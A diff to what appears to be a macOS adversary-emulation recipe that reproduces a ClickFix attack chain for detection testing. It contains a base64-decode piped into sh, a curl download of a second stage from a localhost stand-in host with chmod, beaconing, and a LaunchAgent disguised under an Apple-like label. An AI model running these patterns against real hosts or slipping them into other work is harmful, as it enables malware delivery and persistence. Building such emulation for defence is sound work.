@@ -39,15 +39,20 @@ steps:
   # Piping a decode into sh is self-contained and executes for real with no
   # network dependency, which is why it leads rather than the curl | sh variant
   # (see the note on the fetch step below).
-  - module: proc_spawn
+  - module: proc_exec
     params:
-      command: "echo 'ZWNobyAiW21hY25vaXNlXSBjbGlja2ZpeCBzdGFnZSAxIGV4ZWN1dGVkIjsgc3dfdmVycyAtcHJvZHVjdFZlcnNpb247IGlkIC11bg==' | base64 -d | sh"
+      executable: /bin/sh
+      args:
+        - -c
+        - "echo 'ZWNobyAiW21hY25vaXNlXSBjbGlja2ZpeCBzdGFnZSAxIGV4ZWN1dGVkIjsgc3dfdmVycyAtcHJvZHVjdFZlcnNpb247IGlkIC11bg==' | base64 -d | sh"
 
   # T1082 — the decoded stage profiles the host before pulling anything else down,
   # so an operator only pays for a second stage on a machine worth having
-  - module: proc_discovery
-    params:
-      commands: "sw_vers,system_profiler SPHardwareDataType,whoami,csrutil status"
+  - id: system_discovery
+    include: recipes/system_discovery.yaml
+
+  - id: account_discovery
+    include: recipes/account_discovery.yaml
 
   # T1105 — fetch the second stage to disk.
   #
@@ -57,25 +62,24 @@ steps:
   # 'curl | sh' pipes nothing into sh, which executes and does nothing at all.
   # That would report a technique the host never performed. Point this at a real
   # payload host to exercise the full download-and-run chain.
-  - module: proc_spawn
+  - module: proc_exec
     params:
-      command: "curl -fsSL http://127.0.0.1:8080/update.sh -o /tmp/macnoise_clickfix_stage2 2>/dev/null; chmod +x /tmp/macnoise_clickfix_stage2 2>/dev/null || true"
+      executable: /bin/sh
+      args:
+        - -c
+        - "curl -fsSL http://127.0.0.1:8080/update.sh -o /tmp/macnoise_clickfix_stage2 2>/dev/null; chmod +x /tmp/macnoise_clickfix_stage2 2>/dev/null || true"
 
   # T1071.001 — check in with C2 once the stage is resolved
-  - module: net_beacon
-    params:
-      target: "http://127.0.0.1:8080"
-      count: "3"
-      interval: "2"
+  - id: c2_beacon
+    include: recipes/http_beacon.yaml
+    inputs:
+      target: http://127.0.0.1:8080
+      count: 3
+      interval: 2
 
-  # T1543.001 — LaunchAgent persistence, the usual terminal state of a macOS
+  # T1543.001 - LaunchAgent persistence, the usual terminal state of a macOS
   # ClickFix chain once the stage-2 stealer has run.
-  # Written flat in /tmp rather than into a subdirectory: plist_create's Cleanup
-  # removes the plist but not a parent directory it had to create, so a nested
-  # path would leave an empty directory behind after the run.
-  - module: plist_create
+  - module: svc_launch_agent
     params:
-      output_path: "/tmp/macnoise_clickfix_updatecheck.plist"
-      bundle_id: "com.apple.updatecheck"
-      mode: "launchagent"
       label: "com.apple.updatecheck"
+      program: "/usr/bin/true"
